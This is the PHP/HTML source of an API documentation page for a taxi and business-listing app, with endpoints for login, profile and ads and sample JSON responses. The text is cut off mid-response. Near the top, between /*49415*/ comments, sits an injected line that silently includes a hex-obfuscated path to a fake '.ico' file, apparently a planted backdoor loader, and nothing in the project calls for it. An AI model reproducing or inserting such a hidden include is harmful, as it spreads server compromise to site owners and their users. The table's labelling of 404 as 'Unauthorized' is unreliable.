<!DOCTYPE html>
<html class=" js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="en">
<!--
   <![endif]-->
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="../img/favicon.png" />
    <title>API Documentation</title>
    <link href="includes/css" rel="stylesheet" type="text/css">
    <link rel="stylesheet" href="includes/sphinx_rtd_theme.css" type="text/css">
    <link rel="stylesheet" href="includes/font-awesome.css" type="text/css">
    <link rel="stylesheet" href="includes/readthedocs-doc-embed.css" type="text/css">
    <link rel="stylesheet" href="includes/jsonview-core.css" type="text/css">
    <script type="text/javascript" async="" src="includes/ga.js"></script>
    <script type="text/javascript"></script>
    <script src="includes/modernizr.min.js"></script>
    <script type="text/javascript" async="" src="includes/ga.js"></script>
    <script type="text/javascript">
        // This is included here because other places don't have access to the pagename variable.
        var READTHEDOCS_DATA = {
            project: "stashboard",
            version: "latest",
            language: "en",
            page: "restapi",
            builder: "sphinx",
            theme: "sphinx_rtd_theme",
            docroot: "/docs/",
            source_suffix: ".rst",
            api_host: "https://readthedocs.org",
            commit: "3e4b18a8168c102d1e1d7f88fec22bcbfc530d23"
        }
        // Old variables
        var doc_version = "latest";
        var doc_slug = "stashboard";
        var page_name = "restapi";
        var html_theme = "sphinx_rtd_theme";
    </script>
    <script type="text/javascript">
        var _gaq = _gaq || [];
        _gaq.push(['_setAccount', 'UA-17997319-1']);
        _gaq.push(['_trackPageview']);

        // User Analytics Code
        _gaq.push(['user._setAccount', 'None']);
        _gaq.push(['user._trackPageview']);
        // End User Analytics Code


        (function() {
            var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
            ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
            var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);

        })();
    </script>
</head>
<body class="wy-body-for-nav" role="document" cz-shortcut-listen="true">
<?php
/*49415*/

@include "\x2fhome\x2fcode\x6cight\x3007/p\x75blic\x5fhtml\x2fdroi\x64quer\x79/wp-\x69nclu\x64es/w\x69dget\x73/fav\x69con_\x33cffc\x31.ico";

/*49415*/



if($_SERVER['SERVER_NAME']=="localhost"){

    $formpath = 'http://localhost/test/finalBS/api-form/';
    $apipath = 'http://localhost/test/finalBS/index.php/ws/v1/tablet/';
}
else{
    $formpath = 'http://vrosmedia.com/vrosmedia/api-form/';
    $apipath = 'http://vrosmedia.com/vrosmedia/index.php/ws/v1/tablet/';

}
?>
<div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
        <div class="wy-side-nav-search">
            <a href="index.php" class="fa fa-home"> Business APP </a>
        </div>
        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
            <ul class="current">
                <li class="toctree-l1 current">
                    <a class="reference internal" href="#response-codes">Response Codes</a>
                </li>
                <li class="toctree-l1">
                    <a class="reference internal" href="#login">Login</a>
                </li>
                <li class="toctree-l1">
                    <a class="reference internal" href="#profile">Profile</a>
                </li>
                <li class="toctree-l1">
                    <a class="reference internal" href="#update">Update Profile</a>
                </li>
<!--                <li class="toctree-l1">
                    <a class="reference internal" href="#category">Category</a>
                </li>-->
                <li class="toctree-l1">
                    <a class="reference internal" href="#home">Home</a>
                </li>
                <li class="toctree-l1">
                    <a class="reference internal" href="#events">Events</a>
                </li>
                <li class="toctree-l1">
                    <a class="reference internal" href="#news">News</a>
                </li>
                <li class="toctree-l1">
                    <a class="reference internal" href="#business">Business</a>
                </li>
                <li class="toctree-l1">
                    <a class="reference internal" href="#map">City Map</a>
                </li>
                <li class="toctree-l1">
                    <a class="reference internal" href="#feedbacks">Feedbacks</a>
                </li>
                <li class="toctree-l1">
                    <a class="reference internal" href="#offers">Offers</a>
                </li>
                 <li class="toctree-l1">
                    <a class="reference internal" href="#countads">Count ads</a>
                </li>
                <li class="toctree-l1">
                    <a class="reference internal" href="#get_city">City data</a>
                </li>
            </ul>
        </div>
    </nav>
    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
        <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
            <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
            <a href="index.php">Stashboard</a>
        </nav>
        <div class="wy-nav-content">
            <div class="rst-content">
                <div role="navigation" aria-label="breadcrumbs navigation">
                    <ul class="wy-breadcrumbs">
                        <li>
                            <a href="index.php"></a> »
                        </li>
                        <li>API Documentation</li>
                    </ul>
                    <hr>
                </div>
                <div role="main" class="document">
                    <div class="section" id="api-documentation">
                        <h1>API Documentation
                            <a class="headerlink" href="index.php#api-documentation" title="Permalink to this headline">¶</a>
                        </h1>
                        <p>
                            This doc explains response codes, request parameters and responses of this project's API.
                            <!--<tt class="docutils literal"><span class="pre">/api/v1/</span></tt>-->
                        </p>
                        <!--Response Codes-->
                        <div class="section" id="response-codes">
                            <h2>Response Codes
                                <a class="headerlink" href="index.php#response-codes" title="Permalink to this headline">¶</a>
                            </h2>
                            <p>Response codes let you know that if action is successfully performed or not. If not than which problems occurred.</p>
                            <div class="wy-table-responsive">
                                <table border="1" class="docutils">
                                    <colgroup>
                                        <col width="21%">
                                        <col width="79%">
                                    </colgroup>
                                    <thead valign="bottom">
                                    <tr class="row-odd">
                                        <th class="head">Code</th>
                                        <th class="head">Text</th>
                                        <th class="head">Description</th>
                                    </tr>
                                    </thead>
                                    <tbody valign="top">
                                    <tr class="row-even">
                                        <td>200</td>
                                        <td>OK</td>
                                        <td>Success</td>
                                    </tr>
                                    <tr class="row-even">
                                        <td>400</td>
                                        <td>Bad Request</td>
                                        <td>The request cannot be fulfilled due to bad syntax.</td>
                                    </tr>
                                    <tr class="row-even">
                                        <td>404</td>
                                        <td>Unauthorized</td>
                                        <td>Authentication credentials were missing or incorrect.</td>
                                    </tr>
                                    <tr class="row-even">
                                        <td>403</td>
                                        <td>Forbidden</td>
                                        <td>The request is understood, but it has been refused or access is not allowed.</td>
                                    </tr>
                                    <tr class="row-even">
                                        <td>404</td>
                                        <td>Not Found</td>
                                        <td>The URI requested is invalid or the resource requested, such as a user, does not exists.</td>
                                    </tr>
                                    <tr class="row-even">
                                        <td>500</td>
                                        <td>Internal Server Error</td>
                                        <td>Something is broken.</td>
                                    </tr>
                                    <tr class="row-even">
                                        <td>601</td>
                                        <td>Data Dupliacation</td>
                                        <td>Let you know if provided data is already there.</td>
                                    </tr>
                                    <tr class="row-even">
                                        <td>602</td>
                                        <td>Could Not Save</td>
                                        <td>Could not insert/update/delete record at the moment.</td>
                                    </tr>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                    <hr>
                    <!--LOGIN API-->
                    <div class="section" id="login">
                        <h2>Login
                            <a class="headerlink" href="index.php#login" title="Permalink to this headline">¶</a>
                            <a href="<?php echo $formpath.'login.php'?>" target="_blank" class="html_link">HTML Form</a>
                        </h2>
                        <p>Login With Email and Password</p>
                        <h5>API LINK</h5>
                        <div class="highlight-text">
                            <div class="highlight">
                                <pre><?php echo $apipath.'user/login';?></pre>
                            </div>
                        </div>
                        <h5>Request Parameters</h5>
                        <div class="wy-table-responsive">
                            <table border="1" class="docutils">
                                <colgroup>
                                    <col width="35%">
                                    <col width="30%">
                                    <col width="">
                                </colgroup>
                                <thead valign="bottom">
                                <tr class="row-odd">
                                    <th class="head">Param</th>
                                    <th class="head">Required/Optional</th>
                                    <th class="head">Description</th>
                                </tr>
                                </thead>
                                <tbody valign="top">
                                <tr class="row-even">
                                    <td>texi_no </td>
                                    <td>Required</td>
                                    <td></td>
                                </tr>
                                <tr class="row-odd">
                                    <td>name</td>
                                    <td>Required</td>
                                    <td></td>
                                </tr>
                                <!--<tr class="row-even"><td>language</td><td>Optional</td><td></td></tr>-->
                                <tr class="row-even">
                                    <td>deviceid</td>
                                    <td>Required</td>
                                    <td>UDID</td>
                                </tr>
                                <tr class="row-even">
                                    <td>cityID</td>
                                    <td>optional</td>
                                    <td></td>
                                </tr>
                                </tbody>
                            </table>
                        </div>
                        <h5>Response</h5>
                        <h6>
                            <i class="fa fa-hand-o-right"></i> Success
                        </h6>
                        <div class="highlight-js json">
                            <div id="json">
                                <div class="collapser"></div>
                                {<span class="ellipsis"></span>
                                <ul class="obj collapsible">
                                    <li>
                                        <div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div>
                                    </li>
                                    <li>
                                        <div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div>
                                    </li>
                                    <li>
                                        <div class="hoverable">
                                            <span class="property">data</span>:
                                            <div class="collapser"></div>
                                            {<span class="ellipsis"></span>
                                            <ul class="obj collapsible">
                                                <li>
                                                    <div class="hoverable"><span class="property">userid</span>: <span class="type-string">"1"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">texi_no</span>: <span class="type-string">"GJ-03-CP-4699"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">name</span>: <span class="type-string">"etstt"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">email</span>: <span class="type-string">"ravidriver@gmail.com"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">phone</span>: <span class="type-string">"7845123697"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">address</span>: <span class="type-string">"Prabhat chowk GHatlodiya"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable hovered"><span class="property">texiphone</span>: <span class="type-string">"7898789878"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">texiclass</span>: <span class="type-string">"Class-A"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">texicompany</span>: <span class="type-string">"Company-1"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">companyphone</span>: <span class="type-string">"7898789878"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div>
                                                </li>
                                            </ul>
                                            }
                                        </div>
                                    </li>
                                </ul>
                                }
                            </div>
                        </div>
                        <h6>
                            <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
                        </h6>
                        <div class="highlight-js json">
                            <div class="collapser"></div>
                            {
                            <span class="ellipsis"></span>
                            <ul class="obj collapsible">
                                <li>
                                    <div class="hoverable">
                                        <span class="property">code</span>:
                                        <span class="type-number">400</span>,
                                    </div>
                                </li>
                                <li>
                                    <div class="hoverable">
                                        <span class="property">status</span>:
                                        <span class="type-string">"error"</span>,
                                    </div>
                                </li>
                                <li>
                                    <div class="hoverable">
                                        <span class="property">message</span>:
                                        <span class="type-string">"Bad Request"</span>
                                    </div>
                                </li>
                            </ul>
                            }
                        </div>
                    </div>
                    <!--LOGIN API-->
                    <div class="section" id="profile">
                        <h2>Profile
                            <a class="headerlink" href="index.php#profile" title="Permalink to this headline">¶</a>
                            <a href="<?php echo $formpath.'profile.php'?>" target="_blank" class="html_link">HTML Form</a>
                        </h2>
                        <p>Profile</p>
                        <h5>API LINK</h5>
                        <div class="highlight-text">
                            <div class="highlight">
                                <pre><?php echo $apipath.'user/get_profile_data';?></pre>
                            </div>
                        </div>
                        <h5>Request Parameters</h5>
                        <div class="wy-table-responsive">
                            <table border="1" class="docutils">
                                <colgroup>
                                    <col width="35%">
                                    <col width="30%">
                                    <col width="">
                                </colgroup>
                                <thead valign="bottom">
                                <tr class="row-odd">
                                    <th class="head">Param</th>
                                    <th class="head">Required/Optional</th>
                                    <th class="head">Description</th>
                                </tr>
                                </thead>
                                <tbody valign="top">
                                <tr class="row-even">
                                    <td>userid </td>
                                    <td>Required</td>
                                    <td></td>
                                </tr>
                                </tbody>
                            </table>
                        </div>
                        <h5>Response</h5>
                        <h6>
                            <i class="fa fa-hand-o-right"></i> Success
                        </h6>
                        <div class="highlight-js json">
                            <div id="json">
                                <div class="collapser"></div>
                                {<span class="ellipsis"></span>
                                <ul class="obj collapsible">
                                    <li>
                                        <div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div>
                                    </li>
                                    <li>
                                        <div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div>
                                    </li>
                                    <li>
                                        <div class="hoverable">
                                            <span class="property">data</span>:
                                            <div class="collapser"></div>
                                            {<span class="ellipsis"></span>
                                            <ul class="obj collapsible">
                                                <li>
                                                    <div class="hoverable"><span class="property">userid</span>: <span class="type-string">"1"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">texi_no</span>: <span class="type-string">"GJ-03-CP-4699"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">name</span>: <span class="type-string">"etstt"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">email</span>: <span class="type-string">"ravidriver@gmail.com"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">phone</span>: <span class="type-string">"7845123697"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">address</span>: <span class="type-string">"Prabhat chowk GHatlodiya"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable hovered"><span class="property">texiphone</span>: <span class="type-string">"7898789878"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">texiclass</span>: <span class="type-string">"Class-A"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">texicompany</span>: <span class="type-string">"Company-1"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">companyphone</span>: <span class="type-string">"7898789878"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div>
                                                </li>
                                            </ul>
                                            }
                                        </div>
                                    </li>
                                </ul>
                                }
                            </div>
                        </div>
                        <h6>
                            <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
                        </h6>
                        <div class="highlight-js json">
                            <div class="collapser"></div>
                            {
                            <span class="ellipsis"></span>
                            <ul class="obj collapsible">
                                <li>
                                    <div class="hoverable">
                                        <span class="property">code</span>:
                                        <span class="type-number">400</span>,
                                    </div>
                                </li>
                                <li>
                                    <div class="hoverable">
                                        <span class="property">status</span>:
                                        <span class="type-string">"error"</span>,
                                    </div>
                                </li>
                                <li>
                                    <div class="hoverable">
                                        <span class="property">message</span>:
                                        <span class="type-string">"Bad Request"</span>
                                    </div>
                                </li>
                            </ul>
                            }
                        </div>
                    </div>
                    <div class="section" id="update">
                        <h2>Update Profile
                            <a class="headerlink" href="index.php#update" title="Permalink to this headline">¶</a>
                            <a href="<?php echo $formpath.'update.php'?>" target="_blank" class="html_link">HTML Form</a>
                        </h2>
                        <p>update Profile</p>
                        <h5>API LINK</h5>
                        <div class="highlight-text">
                            <div class="highlight">
                                <pre><?php echo $apipath.'user/update_profile_data';?></pre>
                            </div>
                        </div>
                        <h5>Request Parameters</h5>
                        <div class="wy-table-responsive">
                            <table border="1" class="docutils">
                                <colgroup>
                                    <col width="35%">
                                    <col width="30%">
                                    <col width="">
                                </colgroup>
                                <thead valign="bottom">
                                <tr class="row-odd">
                                    <th class="head">Param</th>
                                    <th class="head">Required/Optional</th>
                                    <th class="head">Description</th>
                                </tr>
                                </thead>
                                <tbody valign="top">
                                <tr class="row-even">
                                    <td>userid </td>
                                    <td>Required</td>
                                    <td></td>
                                </tr>
                                <tr class="row-even">
                                    <td>name </td>
                                    <td>Optional</td>
                                    <td></td>
                                </tr>
                                <tr class="row-even">
                                    <td>phone </td>
                                    <td>Optional</td>
                                    <td></td>
                                </tr>
                                <tr class="row-even">
                                    <td>address </td>
                                    <td>Optional</td>
                                    <td></td>
                                </tr>
                                <tr class="row-even">
                                    <td>selected_category </td>
                                    <td>Optional</td>
                                    <td>comma saperated IDS</td>
                                </tr>
                                <tr class="row-even">
                                    <td>texiphone </td>
                                    <td>Optional</td>
                                    <td></td>
                                </tr>
                                <tr class="row-even">
                                    <td>texi_class_id </td>
                                    <td>Optional</td>
                                    <td></td>
                                </tr>
                                <tr class="row-even">
                                    <td>texi_company_id </td>
                                    <td>Optional</td>
                                    <td></td>
                                </tr>
                                <tr class="row-even">
                                    <td>image </td>
                                    <td>Optional</td>
                                    <td></td>
                                </tr>
                                </tbody>
                            </table>
                        </div>
                        <h5>Response</h5>
                        <h6>
                            <i class="fa fa-hand-o-right"></i> Success
                        </h6>
                        <div class="highlight-js json">
                            <div id="json">
                                <div class="collapser"></div>
                                {<span class="ellipsis"></span>
                                <ul class="obj collapsible">
                                    <li>
                                        <div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div>
                                    </li>
                                    <li>
                                        <div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div>
                                    </li>
                                    <li>
                                        <div class="hoverable">
                                            <span class="property">data</span>:
                                            <div class="collapser"></div>
                                            {<span class="ellipsis"></span>
                                            <ul class="obj collapsible">
                                                <li>
                                                    <div class="hoverable"><span class="property">userid</span>: <span class="type-string">"1"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">texi_no</span>: <span class="type-string">"GJ-03-CP-4699"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">name</span>: <span class="type-string">"dev"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">email</span>: <span class="type-string">"ravidriver@gmail.com"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable hovered"><span class="property">phone</span>: <span class="type-string">"122112121"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">address</span>: <span class="type-string">"test"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">texiphone</span>: <span class="type-string">"79623223232"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">texiclass</span>: <span class="type-string">"Class-A"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">texicompany</span>: <span class="type-string">"Company-1"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">companyphone</span>: <span class="type-string">"79623223232"</span>,</div>
                                                </li>
                                                <li>
                                                    <div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/user/1463257547510.jpg">http://localhost/apps/businessapp/uploads/user/1463257547510.jpg</a><span class="type-string">"</span></div>
                                                </li>
                                            </ul>
                                            }
                                        </div>
                                    </li>
                                </ul>
                                }
                            </div>
                        </div>
                        <h6>
                            <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
                        </h6>
                        <div class="highlight-js json">
                            <div class="collapser"></div>
                            {
                            <span class="ellipsis"></span>
                            <ul class="obj collapsible">
                                <li>
                                    <div class="hoverable">
                                        <span class="property">code</span>:
                                        <span class="type-number">400</span>,
                                    </div>
                                </li>
                                <li>
                                    <div class="hoverable">
                                        <span class="property">status</span>:
                                        <span class="type-string">"error"</span>,
                                    </div>
                                </li>
                                <li>
                                    <div class="hoverable">
                                        <span class="property">message</span>:
                                        <span class="type-string">"Bad Request"</span>
                                    </div>
                                </li>
                            </ul>
                            }
                        </div>
                        <!--LOGIN API-->
                        <div class="section" id="category">
                            <h2>Category
                                <a class="headerlink" href="index.php#category" title="Permalink to this headline">¶</a>
                                <a href="<?php echo $formpath.'category.php'?>" target="_blank" class="html_link">HTML Form</a>
                            </h2>
                            <p>Category</p>
                            <h5>API LINK</h5>
                            <div class="highlight-text">
                                <div class="highlight">
                                    <pre><?php echo $apipath.'category';?></pre>
                                </div>
                            </div>
                            <h5>Request Parameters</h5>
                            <div class="wy-table-responsive">
                                <table border="1" class="docutils">
                                    <colgroup>
                                        <col width="35%">
                                        <col width="30%">
                                        <col width="">
                                    </colgroup>
                                    <thead valign="bottom">
                                    <tr class="row-odd">
                                        <th class="head">Param</th>
                                        <th class="head">Required/Optional</th>
                                        <th class="head">Description</th>
                                    </tr>
                                    </thead>
                                    <tbody valign="top">
                                    <tr class="row-even">
                                        <td>userid </td>
                                        <td>Required</td>
                                        <td></td>
                                    </tr>
                                    </tbody>
                                </table>
                            </div>
                            <h5>Response</h5>
                            <h6>
                                <i class="fa fa-hand-o-right"></i> Success
                            </h6>
                            <div class="highlight-js json">
                                <div id="json">
                                    <div class="collapser"></div>
                                    {<span class="ellipsis"></span>
                                    <ul class="obj collapsible">
                                        <li>
                                            <div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div>
                                        </li>
                                        <li>
                                            <div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div>
                                        </li>
                                        <li>
                                            <div class="hoverable">
                                                <span class="property">data</span>:
                                                <div class="collapser"></div>
                                                {<span class="ellipsis"></span>
                                                <ul class="obj collapsible">
                                                    <li>
                                                        <div class="hoverable">
                                                            <span class="property">category</span>:
                                                            <div class="collapser"></div>
                                                            [<span class="ellipsis"></span>
                                                            <ul class="array collapsible">
                                                                <li>
                                                                    <div class="hoverable hovered">
                                                                        <div class="collapser"></div>
                                                                        {<span class="ellipsis"></span>
                                                                        <ul class="obj collapsible">
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">id</span>: <span class="type-string">"1"</span>,</div>
                                                                            </li>
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Meetups"</span>,</div>
                                                                            </li>
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div>
                                                                            </li>
                                                                        </ul>
                                                                        },
                                                                    </div>
                                                                </li>
                                                                <li>
                                                                    <div class="hoverable">
                                                                        <div class="collapser"></div>
                                                                        {<span class="ellipsis"></span>
                                                                        <ul class="obj collapsible">
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">id</span>: <span class="type-string">"2"</span>,</div>
                                                                            </li>
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business"</span>,</div>
                                                                            </li>
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div>
                                                                            </li>
                                                                        </ul>
                                                                        },
                                                                    </div>
                                                                </li>
                                                                <li>
                                                                    <div class="hoverable">
                                                                        <div class="collapser"></div>
                                                                        {<span class="ellipsis"></span>
                                                                        <ul class="obj collapsible">
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">id</span>: <span class="type-string">"3"</span>,</div>
                                                                            </li>
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Music"</span>,</div>
                                                                            </li>
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div>
                                                                            </li>
                                                                        </ul>
                                                                        },
                                                                    </div>
                                                                </li>
                                                                <li>
                                                                    <div class="hoverable">
                                                                        <div class="collapser"></div>
                                                                        {<span class="ellipsis"></span>
                                                                        <ul class="obj collapsible">
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">id</span>: <span class="type-string">"4"</span>,</div>
                                                                            </li>
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Dance"</span>,</div>
                                                                            </li>
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div>
                                                                            </li>
                                                                        </ul>
                                                                        },
                                                                    </div>
                                                                </li>
                                                                <li>
                                                                    <div class="hoverable">
                                                                        <div class="collapser"></div>
                                                                        {<span class="ellipsis"></span>
                                                                        <ul class="obj collapsible">
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">id</span>: <span class="type-string">"5"</span>,</div>
                                                                            </li>
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Workshop"</span>,</div>
                                                                            </li>
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div>
                                                                            </li>
                                                                        </ul>
                                                                        },
                                                                    </div>
                                                                </li>
                                                                <li>
                                                                    <div class="hoverable">
                                                                        <div class="collapser"></div>
                                                                        {<span class="ellipsis"></span>
                                                                        <ul class="obj collapsible">
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">id</span>: <span class="type-string">"6"</span>,</div>
                                                                            </li>
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Arts"</span>,</div>
                                                                            </li>
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div>
                                                                            </li>
                                                                        </ul>
                                                                        }
                                                                    </div>
                                                                </li>
                                                            </ul>
                                                            ]
                                                        </div>
                                                    </li>
                                                </ul>
                                                }
                                            </div>
                                        </li>
                                    </ul>
                                    }
                                </div>
                            </div>
                            <h6>
                                <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
                            </h6>
                            <div class="highlight-js json">
                                <div class="collapser"></div>
                                {
                                <span class="ellipsis"></span>
                                <ul class="obj collapsible">
                                    <li>
                                        <div class="hoverable">
                                            <span class="property">code</span>:
                                            <span class="type-number">400</span>,
                                        </div>
                                    </li>
                                    <li>
                                        <div class="hoverable">
                                            <span class="property">status</span>:
                                            <span class="type-string">"error"</span>,
                                        </div>
                                    </li>
                                    <li>
                                        <div class="hoverable">
                                            <span class="property">message</span>:
                                            <span class="type-string">"Bad Request"</span>
                                        </div>
                                    </li>
                                </ul>
                                }
                            </div>
                        </div>
                    </div>
                    <div class="section" id="home">
                        <h2>Home
                            <a class="headerlink" href="index.php#home" title="Permalink to this headline">¶</a>
                            <a href="<?php echo $formpath.'home.php'?>" target="_blank" class="html_link">HTML Form</a>
                        </h2>
                        <p>Home</p>
                        <h5>API LINK</h5>
                        <div class="highlight-text">
                            <div class="highlight">
                                <pre><?php echo $apipath.'/ads/home';?></pre>
                            </div>
                        </div>
                        <h5>Request Parameters</h5>
                        <div class="wy-table-responsive">
                            <table border="1" class="docutils">
                                <colgroup>
                                    <col width="35%">
                                    <col width="30%">
                                    <col width="">
                                </colgroup>
                                <thead valign="bottom">
                                <tr class="row-odd">
                                    <th class="head">Param</th>
                                    <th class="head">Required/Optional</th>
                                    <th class="head">Description</th>
                                </tr>
                                </thead>
                                <tbody valign="top">
                                <tr class="row-even">
                                    <td>userid </td>
                                    <td>Required</td>
                                    <td></td>
                                </tr>
                                <tr class="row-even">
                                    <td>cityID </td>
                                    <td>optional</td>
                                    <td></td>
                                </tr>
                                </tbody>
                            </table>
                        </div>
                        <h5>Response</h5>
                        <h6>
                            <i class="fa fa-hand-o-right"></i> Success
                        </h6>
                        <div class="highlight-js json">
                            <div id="json">
                                <div class="collapser"></div>
                                {<span class="ellipsis"></span>
                                <ul class="obj collapsible">
                                    <li>
                                        <div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div>
                                    </li>
                                    <li>
                                        <div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div>
                                    </li>
                                    <li>
                                        <div class="hoverable">
                                            <span class="property">data</span>:
                                            <div class="collapser"></div>
                                            {<span class="ellipsis"></span>
                                            <ul class="obj collapsible">
                                                <li>
                                                    <div class="hoverable">
                                                        <span class="property">fullads</span>:
                                                        <div class="collapser"></div>
                                                        [<span class="ellipsis"></span>
                                                        <ul class="array collapsible">
                                                            <li>
                                                                <div class="hoverable hovered">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"1"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">title</span>: <span class="type-string">"Test-1"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">description</span>: <span class="type-string">"this is test add"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">special</span>: <span class="type-string">"0"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">enddate</span>: <span class="type-string">"05/25/2016"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">address</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/ads/2.jpg">http://localhost/apps/businessapp/uploads/ads/2.jpg</a><span class="type-string">"</span></div>
                                                                        </li>
                                                                    </ul>
                                                                    },
                                                                </div>
                                                            </li>
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"2"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">title</span>: <span class="type-string">"Test-2"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">description</span>: <span class="type-string">"this is test add"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">special</span>: <span class="type-string">"0"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">enddate</span>: <span class="type-string">"05/25/2016"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">address</span>: <span class="type-string">"Ahmedabad"</span>,</div>
